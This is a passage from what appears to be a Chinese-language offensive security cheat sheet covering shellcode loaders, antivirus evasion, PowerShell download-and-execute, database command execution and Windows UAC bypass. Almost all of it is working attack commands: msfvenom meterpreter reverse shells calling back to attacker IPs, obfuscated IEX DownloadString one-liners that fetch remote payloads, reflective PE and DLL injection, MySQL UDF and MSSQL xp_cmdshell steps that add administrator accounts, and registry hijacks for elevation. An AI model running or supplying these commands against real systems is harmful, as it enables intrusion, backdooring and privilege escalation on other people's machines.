![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpjcibdtSGPMS8VELfCrSLlo4RMbzGte47dscoGpzw58FJcalAjKzg3Qw/640?wx_fmt=png)

```
因为我没加汇编指令，中间这里直接按任意键跳过即可，懂的可以在开头添加一些指令，例如xor，inc，dec，add，sub，mov，nop等


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp8XETgibWhKRaSQ8DmAgxawMhFFLsjsIP3dSibJ4F3IIGdMcU6phpLmgg/640?wx_fmt=png)

```
执行完后会生成一些文件


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpT9jWlLzPAK7s3vDzOt0fAAJKRKkMuaFgfIBjrdTLPxJ145sicDeSERw/640?wx_fmt=png)

```
我们只用final\_pshnet\_revhttps.ps1这个文件，打开修改一下


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpvUejPGlW2qCrlhiaaX3FZDYKT8ibYqbUZa0RjUbyrGahdIydkUyauLXw/640?wx_fmt=png)

```
修改成


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpunwWiceeMGlBkTYOgeWKVFfa8DqHgN0KC14Qj1fVNRsGu7rnIh8mL3w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp5zdxgZluibyjRHzsm7niaWrwKVHKkQfrVepTbEvicjJ4IncicoDbWCZzHQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpHia6rA3yeia6BO7qaxxxicaDBh6TX6XWXPtQnBSzwVN3r2vwpTbjooUQQ/640?wx_fmt=png)

Ruby
----

```
目标机器装有ruby时
生成
>msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.0.108 LPORT=12138 -f ruby
粘贴到ruby中

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp5YpUydgsRvvZEIkSPFyprrWOF5gYstHJmt0PFfNjLoXhMY2KNIibnJw/640?wx_fmt=png)

```
执行
>ruby xx.ruby

```

Golang
------

```
生成
>msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.0.108 LPORT=12138 -f c
代码转换成0x格式，粘贴到go.txt中保存为go格式

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFprvfSDtVe022DSWfQavMz4OgIqm3lsUFxib6jlJ54E7HFV6nMqtDtIeg/640?wx_fmt=png)

```
安装golang环境在shellcode目录执行


```

```
\>go build生成exe

```

### 加载器

#### go-shellcode

```
https://github.com/brimstone/go-shellcode
进入cmd/sc目录编译sc.exe
>go build

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp5vd2WVv9vWJAyibNqRiaA0MicSCsFnm8zsgqBK8OXXibuYeQ8Cz9VljNuw/640?wx_fmt=png)

```
生成
>msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.0.108 LPORT=12138 -f hex -o shell.txt 
加载器加载shellcode
>sc.exe shellcode

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpJ1pxI5NlO4L56ickDVmlICFJ0iaibKiaLCZaCXcb11WMI45Ak8micwehtXg/640?wx_fmt=png)

#### Gsl

```
https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/gsl-sc-loader.zip
>gsl -s SHELLCODE -hex msf生成hex格式
>gsl -f shell.raw本地加载raw格式文件
>gsl -f shell.hex -hex 本地加载hex格式文件
>gsl -u http://192.168.0.108/1.raw 远程加载
>gsl -u http://192.168.0.108/1.hex

```

**内网 & 域**
==========

Powershell
----------

### 远程执行

```
\>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('');Invoke-xxx"

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpzWTwfMNJqgyREFWXb4HSCkNQRkhibBcmQjMoWBMC9N7LgGic42hrw1BA/640?wx_fmt=png)

### 加载 exe

```
msfvenom生成exe木马
#msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=192.168.0.107 lport=4444 -f exe > /var/www/html/1.exe  
使用powersploit的Invoke-ReflectivePEInjection.ps1脚本
#powershell.exe -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/clymberps/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://192.168.0.107/1.exe -ForceASLR" 

```

```
EXE2PS1


```

```
http://192.168.0.107/ps/powersploit/CodeExecution/Convert-BinaryToString.ps1
将exe转换为base64
>Import-Module .\\Convert-BinaryToString.ps1
>Convert-BinaryToString -FilePath .\\ms15051.exe

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFplI8tljib8pkqzODmiahiaC8JxbvlVBYANGPHUVxrqQlQQg2ibTLicvUR8RQ/640?wx_fmt=png)

```
http://192.168.0.107/ps/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection.ps1文件头部添加
Function MS15051{
<#
.SYNOPSIS    
.EXAMPLE
C:\\PS> MS15051 -Command "whoami"
#>
 \[CmdletBinding()\]
    param(
        \[Parameter(Mandatory = $False)\]
        \[string\]
        $Command
  )
$InputString = "文件的base64编码"
$PEBytes = \[System.Convert\]::FromBase64String($InputString)
文件尾部添加
write-host ("\[+\] Executing Command: "+$Command)  -foregroundcolor "Green"
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command 
write-host ("\[+\] Done !")  -foregroundcolor "Green"
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpO77DZzcr3PgOnHjflu4pUy55sRuU96zpvQV44Bp0GXyVf0sWU6BibRQ/640?wx_fmt=png)

```
远程下载执行
>powershell -nop -w hidden -ep bypass "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.0.107/ps/powersploit/CodeExecution/ms15051.ps1'); MS15051 –Command \\"whoami\\""

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpDsphuxlpZcicFfBx2dln1Q4v8jGhICicqLRT66hgWzorhNyax2fTFTAg/640?wx_fmt=png)

### 绕过策略

```
\>powershell Set-ExecutionPolicy Unrestricted需管理员权限，不受限执行
>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/Invoke-xxx.ps1');invoke-xxx"
>powershell -exec bypass -File ./a.ps1&>Import-Module xxx

```

```
Base64


```

```
\>use exploit/multi/script/web\_delivery|target=2(PSH)
&
>cat payload.txt | iconv --to-code UTF-16LE |base64
>powershell -ep bypass -enc base64code

```

#### 写入 bat 绕过

```
powershell -exec bypass -File ./a.ps1 
将该命令保存为c.bat

```

#### 拼接拆分字符串

```
powershell.exe  
"
$c1='powershell -c IEX'; 
$c2='(New-Object Net.WebClient).Downlo'; 
$c3='adString("http://192.168.197.192/a.ps1")'; 
echo ($c1,$c2,$c3) 
" 
先将命令拆分为字符串，然后进行拼接。echo修改为IEX执行。
powershell $c2='IEX (New-Object Net.WebClient).Downlo';$c3='adString(''http://x.x.x.x/a'')'; $Text=$c2+$c3; IEX(-join $Text)

```

```
Replace替换函数


```

```
powershell -noexit "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://192.168.0.108/1.ps1'')'.Replace('123','adString');IEX ($c1+$c2)" 

```

```
HTTP字符拼接绕过


```

```
也可以对http字符进行绕过，同样可以bypass
powershell "$a='IEX((new-object net.webclient).downloadstring("ht';$b='tp://192.168.197.192/a.ps1"))';IEX ($a+$b)"  

```

```
图片免杀


```

```
通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。
https://github.com/peewpw/Invoke-PSImage
1900\*1200的图片x.jpg。
C:\\>powershell 
PS C:\\> Import-Module .\\Invoke-PSImage.ps1 
PS C:\\> Invoke-PSImage -Script .\\a.ps1 -Image .\\x.jpg -Out .\\reverse\_shell.png -Web 
a.ps1是msf木马，-Out 生成reverse\_shell.png图片，-Web 输出从web读取的命令。
将reverse\_shell.png移动至web目录，替换url地址。在powershell下执行即可。

```

```
加载shellcode


```

```
msfvenom生成脚本木马
#msfvenom -p windows/x64/meterpreter/reverse\_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test  
在windows靶机上运行一下命令
PS >IEX(New-Object Net.WebClient).DownloadString("http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1") 
PS >IEX(New-Object Net.WebClient).DownloadString("http://192.168.72.164/test") 
Invoke-Shellcode -Shellcode $buf -Force  运行木马 
使用Invoke-Shellcode.ps1脚本执行shellcode
即可反弹meterpreter shell

```

#### 加载 dll

```
使用msfvenom 生成dll木马脚本
>msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll 
将生成的dll上传到目标的C盘。在靶机上执行以下命令
PS >IEX(New-Object Net.WebClient).DownloadString("http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1") 
Start-Process c:\\windows\\system32\\notepad.exe -WindowStyle Hidden  
创建新的进程启动记事本，并设置为隐藏
Invoke-DllInjection -ProcessID xxx -Dll c:\\test.dll 使用notepad的PID  
Msf
#use exploit/multi/handler
#set payload windows/x64/meterpreter/reverse\_tcp
#run

```

Windows 安全标识符 (SID)
-------------------

<table><thead><tr><th>相对标识符</th><th>说明</th></tr></thead><tbody><tr><td>500</td><td>管理员</td></tr><tr><td>501</td><td>来宾</td></tr><tr><td>502</td><td>密钥分发中心服务的服务账户</td></tr><tr><td>512</td><td>域管理员</td></tr><tr><td>513</td><td>域用户</td></tr><tr><td>514</td><td>域来宾</td></tr><tr><td>515</td><td>域计算机</td></tr><tr><td>516</td><td>域控制器</td></tr><tr><td>544</td><td>内置管理员</td></tr><tr><td>519</td><td>企业管理员</td></tr></tbody></table>

**提权**
------

### Impacket 工具包

```
https://github.com/maaaaz/impacket-examples-windows
https://github.com/SecureAuthCorp/impacket
#git clone https://github.com/CoreSecurity/impacket.git 
#cd impacket/ 
#python setup.py install

```

### Windows-exploit-suggester

```
#pip install xlrd --upgrade
#./windows-exploit-suggester.py --update
#./windows-exploit-suggester.py --database 20xx-xx-xx-mssb.xlsx --systeminfo systeminfo.txt

```

```
Wesng


```

```
https://github.com/bitsadmin/wesng
>systeminfo >1.txt
>python wes.py 1.txt

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpSoGIbjmF4WmgicIyRAgwZNtU6xTeQefibicyjCAfgNd7JdBGGrQdZwa8g/640?wx_fmt=png)

### Searchsploit

```
使用方法
>searchsploit 软件 版本
查找常见补丁
https://bugs.hacking8.com/tiquan/
http://get-av.se7ensec.cn/index.php
https://patchchecker.com/checkprivs/
wmic查询补丁
wmic qfe list full|findstr /i hotfix
systeminfo>temp.txt&(for %i in (KB2271195 KB2124261 KB2160329 KB2621440  KB2707511 KB2829361 KB2864063 KB3000061 KB3045171 KB3036220 KB3077657 KB3079904 KB3134228 KB3124280 KB3199135) do @type temp.txt|@find /i  "%i"|| @echo %i Not Installed!)&del /f /q /a temp.txt
MS17-017 \[KB4013081\] \[GDI Palette Objects Local Privilege Escalation\] (windows 7/8) 
CVE-2017-8464 \[LNK Remote Code Execution Vulnerability\] (windows 10/8.1/7/2016/2010/2008) 
CVE-2017-0213 \[Windows COM Elevation of Privilege Vulnerability\] (windows 10/8.1/7/2016/2010/2008) 
MS17-010 \[KB4013389\] \[Windows Kernel Mode Drivers\] (windows 7/2008/2003/XP) 
MS16-135 \[KB3199135\] \[Windows Kernel Mode Drivers\] (2016) 
MS16-111 \[KB3186973\] \[kernel api\] (Windows 10 10586 (32/64)/8.1) 
MS16-098 \[KB3178466\] \[Kernel Driver\] (Win 8.1) 
MS16-075 \[KB3164038\] \[Hot Potato\] (2003/2008/7/8/2012) 
MS16-034 \[KB3143145\] \[Kernel Driver\] (2008/7/8/10/2012) 
MS16-032 \[KB3143141\] \[Secondary Logon Handle\] (2008/7/8/10/2012) 
MS16-016 \[KB3136041\] \[WebDAV\] (2008/Vista/7) 
MS15-097 \[KB3089656\] \[remote code execution\] (win8.1/2012) 
MS15-076 \[KB3067505\] \[RPC\] (2003/2008/7/8/2012) 
MS15-077 \[KB3077657\] \[ATM\] (XP/Vista/Win7/Win8/2000/2003/2008/2012) 
MS15-061 \[KB3057839\] \[Kernel Driver\] (2003/2008/7/8/2012) 
MS15-051 \[KB3057191\] \[Windows Kernel Mode Drivers\] (2003/2008/7/8/2012) 
MS15-010 \[KB3036220\] \[Kernel Driver\] (2003/2008/7/8) 
MS15-015 \[KB3031432\] \[Kernel Driver\] (Win7/8/8.1/2012/RT/2012 R2/2008 R2) 
MS15-001 \[KB3023266\] \[Kernel Driver\] (2008/2012/7/8) 
MS14-070 \[KB2989935\] \[Kernel Driver\] (2003) 
MS14-068 \[KB3011780\] \[Domain Privilege Escalation\] (2003/2008/2012/7/8) 
MS14-058 \[KB3000061\] \[Win32k.sys\] (2003/2008/2012/7/8) 
MS14-040 \[KB2975684\] \[AFD Driver\] (2003/2008/2012/7/8) 
MS14-002 \[KB2914368\] \[NDProxy\] (2003/XP) 
MS13-053 \[KB2850851\] \[win32k.sys\] (XP/Vista/2003/2008/win 7) 
MS13-046 \[KB2840221\] \[dxgkrnl.sys\] (Vista/2003/2008/2012/7) 
MS13-005 \[KB2778930\] \[Kernel Mode Driver\] (2003/2008/2012/win7/8) 
MS12-042 \[KB2972621\] \[Service Bus\] (2008/2012/win7) 
MS12-020 \[KB2671387\] \[RDP\] (2003/2008/7/XP) 
MS11-080 \[KB2592799\] \[AFD.sys\] (2003/XP) 
MS11-062 \[KB2566454\] \[NDISTAPI\] (2003/XP) 
MS11-046 \[KB2503665\] \[AFD.sys\] (2003/2008/7/XP) 
MS11-011 \[KB2393802\] \[kernel Driver\] (2003/2008/7/XP/Vista) 
MS10-092 \[KB2305420\] \[Task Scheduler\] (2008/7) 
MS10-065 \[KB2267960\] \[FastCGI\] (IIS 5.1, 6.0, 7.0, and 7.5) 
MS10-059 \[KB982799\] \[ACL-Churraskito\] (2008/7/Vista) 
MS10-048 \[KB2160329\] \[win32k.sys\] (XP SP2 & SP3/2003 SP2/Vista SP1 & SP2/2008 Gold & SP2 & R2/Win7) 
MS10-015 \[KB977165\] \[KiTrap0D\] (2003/2008/7/XP) 
MS10-012 \[KB971468\] \[SMB Client Trans2 stack overflow\] (Windows 7/2008R2) 
MS09-050 \[KB975517\] \[Remote Code Execution\] (2008/Vista) 
MS09-020 \[KB970483\] \[IIS 6.0\] (IIS 5.1 and 6.0) 
MS09-012 \[KB959454\] \[Chimichurri\] (Vista/win7/2008/Vista) 
MS08-068 \[KB957097\] \[Remote Code Execution\] (2000/XP) 
MS08-067 \[KB958644\] \[Remote Code Execution\] (Windows 2000/XP/Server 2003/Vista/Server 2008) 
MS08-066 \[\] \[\] (Windows 2000/XP/Server 2003) 
MS08-025 \[KB941693\] \[Win32.sys\] (XP/2003/2008/Vista) 
MS06-040 \[KB921883\] \[Remote Code Execution\] (2003/xp/2000) 
MS05-039 \[KB899588\] \[PnP Service\] (Win 9X/ME/NT/2000/XP/2003)
MS03-026 \[KB823980\] \[Buffer Overrun In RPC Interface\] (/NT/2000/XP/2003)

```

```
激活guest


```

```
\>net user guest /active:yes

```

### MYSQL udf

```
Udf: sqlmap-master\\udf\\mysql\\windows\\
>python sqlmap/extra/cloak/cloak.py lib\_mysqludf\_sys.dll \_ 
Mysql>5.1 udf.dll放置在lib\\plugin 
Mysql<5.1 udf.dll放置在c:\\windows\\system32
#show variables like '%compile%'; 查看系统版本
#select @@plugin\_dir 查看插件目录
放入udf
#select load\_file('\\\\\\\\192.168.0.19\\\\network\\\\lib\_mysqludf\_sys\_64.dll') into dumpfile "D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll"; 
或将udf十六进制编码后写入
#select hex(load\_file('udf\_sys\_64.dll')) into dumpfile '/tmp/udf.hex'; 
#select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000… into dump file "D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll";
或将udf base64编码后写入(MySQL 5.6.1和MariaDB 10.0.5)
#select to\_base64(load\_file('/usr/udf.dll')) into dumpfile '/tmp/udf.b64';
#select from\_base64(“xxxxx”) into dumpfile "D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll";
或创建表拼接十六进制编码
#create table temp(data longblob); 
#insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d); 
#update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b3); 
#select data from temp into dump file "D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll";
或#insert into temp(data) values(hex(load\_file('D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll')));
#SELECT unhex(cmd) FROM mysql.temp INTO DUMPFILE 'D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll ';
或使用快速导入数据
#load data infile '\\\\\\\\192.168.0.19\\\\network\\\\udf.hex'
#into table temp fields terminated by '@OsandaMalith' lines terminated by '@OsandaMalith' (data); 
#select unhex(data) from temp into dumpfile 'D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll';
创建函数
#create function cmdshell returns string soname 'udf.dll';
#create function sys\_exec returns int soname 'udf.dll';
执行命令
#select cmdshell('whoami'); 
#select sys\_exec(''whoami''); 
删除函数
#drop function cmdshell;
#drop function sys\_exec;

```

### MYSQL Linux Root

```
https://0xdeadbeef.info/exploits/raptor\_udf2.c
$ gcc -g -c raptor\_udf2.c
$ gcc -g -shared -W1,-soname,raptor\_udf2.so -o raptor\_udf2.so raptor\_udf2.o -lc
$ mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load\_file('/home/raptor/raptor\_udf2.so'));
mysql> select \* from foo into dumpfile '/usr/lib/raptor\_udf2.so';
mysql> create function do\_system returns integer soname 'raptor\_udf2.so';
mysql> select \* from mysql.func;

```

<table><thead><tr><th>name</th><th>ret</th><th>dl</th><th>type</th></tr></thead><tbody><tr><td>do_system</td><td>2</td><td>raptor_udf2.so</td><td>function</td></tr></tbody></table>

```
mysql> select do\_system('id > /tmp/out; chown raptor.raptor /tmp/out');
mysql> \\! sh
sh-2.05b$ cat /tmp/out
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)

```

```
MSSQL


```

```
开启xp\_cmdshell

```

#### xp\_cmdshell

```
#exec sp\_configure 'show advanced options', 1;reconfigure; 
#exec sp\_configure 'xp\_cmdshell',1;reconfigure;
#exec master.dbo.xp\_cmdshell 'ipconfig'

```

#### xp\_regwrite

```
xp\_regwrite 'HKEY\_LOCAL\_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe','debugger','reg\_sz','c:\\windows\\system32\\taskmgr.exe'

```

```
xp\_dirtree


```

```
execute master..xp\_dirtree 'c:' //列出所有c:\\文件和目录,子目录 
execute master..xp\_dirtree 'c:',1 //只列c:\\文件夹 
execute master..xp\_dirtree 'c:',1,1 //列c:\\文件夹加文件

```

#### sp\_oacreate

```
exec sp\_configure 'show advanced options', 1;RECONFIGURE;
exec sp\_configure 'Ola Automation Procedures' , 1;RECONFIGURE;
执行命令
declare @shell int 
exec sp\_oacreate 'wscript.shell',@shell output 
exec sp\_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net user 123 123 /add'
declare @shell int 
exec sp\_oacreate 'wscript.shell',@shell output 
exec sp\_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net localgroup administrators 123/add'
删除文件
declare @result int
declare @fso\_token int
exec sp\_oacreate 'scripting.filesystemobject', @fso\_token out
exec sp\_oamethod @fso\_token,'deletefile',null,'c:\\1.txt'
exec sp\_oadestroy @fso\_token
复制文件
declare @o int
exec sp\_oacreate 'scripting.filesystemobject',@o out
exec sp\_oamethod @o,'copyfile',null,'c:\\1.txt','c:\\2.txt'
移动文件
declare @o int
exec sp\_oacreate 'scripting.filesystemobject',@o out
exec sp\_oamethod @o,'movefile',null,'c:\\1.txt','c:\\2.txt'

```

#### 沙盒执行

```
开启沙盒：
>exec master..xp\_regwrite 'HKEY\_LOCAL\_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG\_DWORD',1
执行：
>select \* from openrowset('microsoft.jet.oledb.4.0',';database=c:\\windows\\system32\\ias\\dnary.mdb','select shell("whoami")')

```

```
WarSQLKit(后门)


```

```
http://eyupcelik.com.tr/guvenlik/493-mssql-fileless-rootkit-warsqlkit

```

```
MSF


```

```
发现补丁
#use post/windows/gather/enum\_patches
列举可用EXP
#use post/multi/recon/local\_exploit\_suggester

```

### **Bypass UAC**

#### **MSF**

```
\>use exploit/windows/local/bypassuac 
>use exploit/windows/local/bypassuac\_injection
>use exploit/windows/local/bypassuac\_vbs
>use exploit/windows/local/bypassuac\_fodhelper
>use exploit/windows/local/bypassuac\_eventvwr
>use exploit/windows/local/bypassuac\_comhijack

```

#### **DccwBypassUAC**

```
Use on win10&win8

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpTaicp9b14Q5huvQBKSllib4yDtCraxHjzCDcmGXUq8ySk55XQz6U4cSw/640?wx_fmt=png)

#### K8uac

```
\>k8uac.exe xx.exe
>k8uac.exe "command"

```

#### CMSTP

`设置UAC和Applocker规则`

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpibtzic8ViazwTfSg2haLqyLqQ9JMlanNr65y1BZY6uibLicTE6icROgarzHg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFppLnRRXOLibSicHrQsKhC8kPRA2KjK2oauV7pOic8Hb4XJENml6YErP9Fw/640?wx_fmt=png)

```
MSF生成恶意DLL传入靶机
>msfvenom -p windows/x64/meterpreter/
reverse\_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/cm.dll

```

#### Uacme

```
包括DLL劫持，COM劫持等50多种bypass方法
https://github.com/hfiref0x/UACME

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpy7qnjrPgj3d9fSKckz7YicNIf1icqhco9vmpIicN7Wib6IB9hIqP2SbZYg/640?wx_fmt=png)

```
使用visual studio编译
Visual Studio 2013v120；
Visual Studio 2015v140；
Visual Studio 2017v141;
Visual Studio 2019v142。
目前共59种bypassuac方式
执行方法是
>akagi.exe 1
>akagi.exe 1 c:\\windows\\system32\\cmd.exe
>akagi.exe 1 "net user 1 1 /add"
注意：
方式5，9会对目标安全性产生影响，谨慎使用，5需重启
方式6从win8开始在x64上不可用
方式11，54只支持x32 
方式13，19，30，50只支持x64
方式14需要进程注入，x64要使用x64的工具

```

#### Bypass-UAC

```
https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
>Bypass-UAC -Method UacMethodSysprep

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpZGqvo5kELmIlKuq0gR492VUpbzQaOfWUGicIUZlfzHJVEn6L1Y1QiaJw/640?wx_fmt=png)

```
Method:
UacMethodSysprep
ucmDismMethod
UacMethodMMC2
UacMethodTcmsetup
UacMethodNetOle32

```

#### DLL hijack

```
程序运行，调用DLL的流程
1.程序所在目录
2.系统目录即 SYSTEM32 目录
3.16位系统目录即 SYSTEM 目录
4.Windows目录
5.加载 DLL 时所在的当前目录
6.PATH环境变量中列出的目录
使用
https://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck
检查一个程序的是否以高权限执行
>sigcheck.exe -m c:\\1.exe
查看autoElevate是否为true

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpaFfA4ff9DDUVbhAiavRJGa0OjNnlGr4PyCicTDOzhnSP87Cq7NsbXTfA/640?wx_fmt=png)

```
使用process monitor查看对应程序执行时调用的DLL情况，查找DLL不在
HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs列表中，并且所在文件夹当前用户可读写，接下来生成恶意dll备份原DLL替换，再运行此程序即可劫持成功。

```

```
SilentCleanup


```

```
\>reg add hkcu\\Environment /v windir /d "cmd /K reg delete hkcu\\Environment /v windir /f && REM "
>schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I

```

```
Sdclt


```

```
win10

```

##### 1

```
\>reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" /t REG\_SZ /d %COMSPEC% /f 获得管理员权限
>sdclt 弹出cmd
>reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" /f 清除痕迹

```

```
2


```

```
https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1
>Invoke-SDCLTBypass -Command "c:\\windows\\system32\\cmd.exe /c C:\\Windows\\regedit.exe"
>sdclt.exe /KickOffElev

```

#### **Makecab&Wusa**

```
    复制文件出错时


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFptoRye43XMCJ8jUtiaDzAfAOAfTzFBIn0OBIY2j5arUZKhZOYnoibY8GQ/640?wx_fmt=png)

```
\>makecab PsExec64.exe C:\\Users\\y.ZONE\\Desktop\\ps.cab
>wusa C:\\Users\\y.ZONE\\Desktop\\ps.cab /extract:C:\\Windows\\system32\\

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpavM5ccQzZrLX2MaJibKGlhZzdiaADTxEDAIzfzECYd1c5Rozib87t7utQ/640?wx_fmt=png)

CLR BypassUAC  

```
Tested on win10 x64
生成dll传入受控机temp目录，以下保存为1.bat执行。
REG ADD "HKCU\\Software\\Classes\\CLSID\\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\\InprocServer32" /ve /t REG\_EXPAND\_SZ /d "C:\\Temp\\test.dll" /f
REG ADD "HKCU\\Environment" /v "COR\_PROFILER" /t REG\_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
REG ADD "HKCU\\Environment" /v "COR\_ENABLE\_PROFILING" /t REG\_SZ /d "1" /f
REG ADD "HKCU\\Environment" /v "COR\_PROFILER\_PATH" /t REG\_SZ /d "C:\\Temp\\test.dll" /f
受控机执行gpedit.msc或eventvwr等高权限.net程序时可劫持成功。

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpibUTO6z3p9IIzNYyaypmlfTUgkTcVssK9VGEv1icBLrKz00HcicKTEjQg/640?wx_fmt=png)

```
执行后


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpNEefMKshYdHJRaJep9QCPfUJwO0UbKbMMRmdR9Q9VGMURKkXVCdAJQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpMvDL5GoVqPWNmHYM51wZp9SvrJ8McJrziatTQwHBAD0ib9BHqDYm6jcA/640?wx_fmt=png)

**eventvwr 劫持注册表**

```
打开ProcessMonitor，启动eventvwr，ctrl+T打开进程树，选择进程转到事件

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpMwcjDkU28cLO8yvZgTaoG2O2R7QIGSVN2C84JehoJwiawvylwobxicyg/640?wx_fmt=png)

```
右键选择包括eventvwr.exe


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpuZJQWebAZicqRzJzViacbEthDcSUVwwXF3LCUrY27NE2lgmhMbK0fPcg/640?wx_fmt=png)

```
只选择显示注册表活动


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpAF1SiaOL6la3CnuLv7HN9bLM7Dsc5k54robbwCKoPbNajavbPq1dnibw/640?wx_fmt=png)

```
添加一条过滤器，显示not found文件


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFplwue8Lh863JU4qfFDECRP3lHEUacKwuRcFXbV1iccW6WlgQ6lzGmclg/640?wx_fmt=png)

`找到相应的注册表位置`

